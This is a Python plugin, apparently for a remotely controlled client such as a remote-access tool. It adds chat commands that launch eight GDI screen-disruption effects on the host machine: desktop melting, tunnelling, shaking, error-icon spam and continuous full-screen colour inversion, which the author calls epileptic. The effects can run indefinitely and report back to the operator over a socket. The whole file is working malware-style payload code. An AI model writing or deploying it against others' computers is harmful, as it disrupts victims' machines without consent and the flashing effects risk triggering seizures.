# NAME: GDI Plugin Pack
# DESC: 8 GDI эффектов с возможностью остановки, справка - /gdi 

import win32gui
import win32con
import ctypes
import random
import time
import threading
import math
import __main__

# Достаем функцию отправки ответа из основного модуля клиента
send_response = getattr(__main__, 'send_response', lambda conn, text: print(text))
current_conn = getattr(__main__, 'current_socket', None)

if not hasattr(__main__, '_gdi_active_effects'):
    __main__._gdi_active_effects = {}

def get_screen():
    u32 = ctypes.windll.user32
    u32.SetProcessDPIAware()
    return u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)

def run_eff(name, func, duration=None):
    if name in __main__._gdi_active_effects:
        return f"⚠️ `{name}` уже запущен."
    
    stop_event = threading.Event()
    __main__._gdi_active_effects[name] = stop_event
    
    def worker():
        try:
            func(stop_event)
        finally:
            __main__._gdi_active_effects.pop(name, None)
            # Отправляем уведомление при окончании
            global current_conn
            msg = f"🔔 Эффект `{name}` завершен."
            send_response(__main__.current_socket, msg)

    threading.Thread(target=worker, daemon=True).start()

    # Если указано время, запускаем таймер на остановку
    if duration:
        threading.Timer(duration, lambda: stop_event.set()).start()
        return f"✅ `{name}` запущен на {duration} сек."
    
    return f"✅ `{name}` запущен бессрочно."

# --- Описания эффектов ---
EFFECTS_INFO = {
    "tunnel": " Бесконечное сужение экрана внутрь себя.",
    "melt": " Пиксели стекают вниз, как расплавленное стекло.",
    "errors": " Хаотичный спам системными иконками ошибок.",
    "invert": " Постоянная инверсия цветов (эпилептично).",
    "hell": " Тряска с инверсией — сильный хаос.",
    "train": " Экран плывет горизонтальными волнами.",
    "shake": " Интенсивная тряска всего рабочего стола.",
    "bounce": " Случайные куски экрана прыгают по монитору."
}
# --- GDI Логика ---

def eff_tunnel(s):
    w, h = get_screen(); hdc = win32gui.GetDC(0)
    while not s.is_set():
        win32gui.StretchBlt(hdc, 15, 15, w-30, h-30, hdc, 0, 0, w, h, win32con.SRCCOPY)
        time.sleep(0.05)
    win32gui.ReleaseDC(0, hdc)

def eff_melt(s):
    w, h = get_screen(); hdc = win32gui.GetDC(0)
    while not s.is_set():
        x = random.randint(0, w-100)
        win32gui.BitBlt(hdc, x, random.randint(1, 20), 100, h, hdc, x, 0, win32con.SRCCOPY)
        time.sleep(0.01)
    win32gui.ReleaseDC(0, hdc)

def eff_errors(s):
    w, h = get_screen(); hdc = win32gui.GetDC(0)
    icons = [win32gui.LoadIcon(None, win32con.IDI_ERROR), win32gui.LoadIcon(None, win32con.IDI_EXCLAMATION)]
    while not s.is_set():
        win32gui.DrawIcon(hdc, random.randint(0, w), random.randint(0, h), random.choice(icons))
        time.sleep(0.1)
    win32gui.ReleaseDC(0, hdc)

def eff_invert(s):
    w, h = get_screen(); hdc = win32gui.GetDC(0)
    while not s.is_set():
        win32gui.InvertRect(hdc, (0, 0, w, h))
        time.sleep(0.4)
    win32gui.ReleaseDC(0, hdc)

def eff_hell(s):
    w, h = get_screen(); hdc = win32gui.GetDC(0)
    while not s.is_set():
        win32gui.BitBlt(hdc, random.randint(-5, 5), random.randint(-5, 5), w, h, hdc, 0, 0, win32con.NOTSRCCOPY)
        time.sleep(0.08)
    win32gui.ReleaseDC(0, hdc)

def eff_train(s):
    w, h = get_screen(); hdc = win32gui.GetDC(0); a = 0
    while not s.is_set():
        for i in range(0, h, 30):
            shift = int(math.sin(a + i/80) * 20)
            win32gui.BitBlt(hdc, shift, i, w, 30, hdc, 0, i, win32con.SRCCOPY)
        a += 0.4; time.sleep(0.02)
    win32gui.ReleaseDC(0, hdc)

def eff_shake(s):
    w, h = get_screen(); hdc = win32gui.GetDC(0)
    while not s.is_set():
        win32gui.BitBlt(hdc, random.randint(-8, 8), random.randint(-8, 8), w, h, hdc, 0, 0, win32con.SRCCOPY)
        time.sleep(0.01)
    win32gui.ReleaseDC(0, hdc)

def eff_bounce(s):
    w, h = get_screen(); hdc = win32gui.GetDC(0)
    while not s.is_set():
        sw, sh = 250, 250
        win32gui.BitBlt(hdc, random.randint(0, w-sw), random.randint(0, h-sh), sw, sh, hdc, random.randint(0, w-sw), random.randint(0, h-sh), win32con.SRCCOPY)
        time.sleep(0.05)
    win32gui.ReleaseDC(0, hdc)

# --- Команды ---

def cmd_gdi(args):
    parts = args.strip().split()
    m = parts[0].lower() if parts else ""
    duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else None
    
    active_list = list(__main__._gdi_active_effects.keys())
    status = f"📊 *Активно: {len(active_list)}*" + (f" (`{', '.join(active_list)}`)" if active_list else "")
    
    if not m:
        help_msg = f"🎨 *GDI PACK*\n{status}\n\n"
        for name, desc in EFFECTS_INFO.items():
            help_msg += f"• `{name}`: {desc}\n"
        help_msg += "\n▶️ `/gdi <имя> [время в сек]`\n🛑 `/gdi_stop <название|all>`\nПример: `/gdi melt 15`"
        return help_msg

    effects_map = {
        "tunnel": eff_tunnel, "melt": eff_melt, "errors": eff_errors,
        "invert": eff_invert, "hell": eff_hell, "train": eff_train,
        "shake": eff_shake, "bounce": eff_bounce
    }
    
    if m in effects_map:
        return run_eff(m, effects_map[m], duration)
    return f"❓ Эффект `{m}` не найден."

def cmd_gdi_stop(args):
    m = args.strip().lower()
    if not m or m == "all":
        count = len(__main__._gdi_active_effects)
        for k in list(__main__._gdi_active_effects.keys()):
            __main__._gdi_active_effects[k].set()
        return f"🛑 Остановлено эффектов: {count}"
    
    if m in __main__._gdi_active_effects:
        __main__._gdi_active_effects[m].set()
        return f"🛑 Останавливаю `{m}`..."
    return "❌ Не запущен."

PLUGINS = {"/gdi": cmd_gdi, "/gdi_stop": cmd_gdi_stop}